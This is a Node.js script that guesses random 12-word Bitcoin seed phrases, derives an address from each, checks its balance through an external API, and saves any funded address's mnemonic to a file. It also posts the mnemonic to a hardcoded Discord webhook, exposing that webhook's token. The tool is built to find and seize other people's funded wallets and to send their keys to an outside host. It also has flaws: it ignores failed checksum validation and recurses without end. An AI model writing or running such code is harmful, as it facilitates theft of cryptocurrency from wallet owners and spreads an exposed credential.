const { appendFileSync, readFileSync } = require('fs');


const pool = JSON.parse(readFileSync('./wordPool.json', 'utf8'));
const getRandomWords = () => {
  const randomWords = [];
  for (let i = 0; i < 12; i++) {
    const randomIndex = Math.floor(Math.random() * pool.length);
    randomWords.push(pool[randomIndex]);
  }
  return randomWords;
};

const bitcoin = require('bitcoinjs-lib');
const bip39 = require('bip39');
const { BIP32Factory } = require('bip32');
const ecc = require('tiny-secp256k1');
const axios = require('axios');


const huntWallet = async () => {
  const bip32 = BIP32Factory(ecc);
  // Replace this with your own mnemonic
  const mnemonic = getRandomWords().join(' ');

  console.log(bip39.validateMnemonic(mnemonic));

  // Generate a seed buffer from the mnemonic
  const seedBuffer = bip39.mnemonicToSeedSync(mnemonic);

  // Derive a master node from the seed buffer
  const masterNode = bip32.fromSeed(seedBuffer);

  // Derive a child node for the first Bitcoin address
  const childNode = masterNode.derivePath("m/0'/0'/0'/0/0");

  // Get the public key from the child node
  const publicKeyBuffer = childNode.publicKey;

  // Convert the public key buffer to a hex string
  const publicKeyHex = publicKeyBuffer.toString('hex');

  // Create a bitcoin address from the public key
  const { address } = bitcoin.payments.p2pkh({ pubkey: publicKeyBuffer });

  console.log('Public key:', publicKeyHex);
  console.log('Bitcoin address:', address);
  console.log('Mnemonic:', mnemonic);

  await axios.get(`https://api.tatum.io/v3/bitcoin/address/balance/${address}`)
    .then(response => {
      const balance = response.data.incoming
      if (balance > 0) {
        appendFileSync('./wallet.txt', `${address} ${balance} ${mnemonic} \n`);
        axios.post('https://discord.com/api/webhooks/1077587249018970162/Nev6_cCBykz44fl3zDK3vaMU4x7USgUnWDl6nIG56WDRWv5mheBle6vjkj1QObVvPLjv', {
          "username": "Wallet Found",
          "avatar_url": "https://i.imgur.com/4M34hi2.png",
          "content": `
          address: ${address}\nbalance: ${balance}\nkey: ${mnemonic}`,
        }).catch(err => console.log(err));
      }
      console.log(`Balance of address ${address}: ${balance} BTC`);
    })
    .catch(error => {
      console.error(error);
    });
  await new Promise(resolve => setTimeout(resolve, 1000));
  await huntWallet();
}

// huntWallet();
module.exports = { getRandomWords, huntWallet }
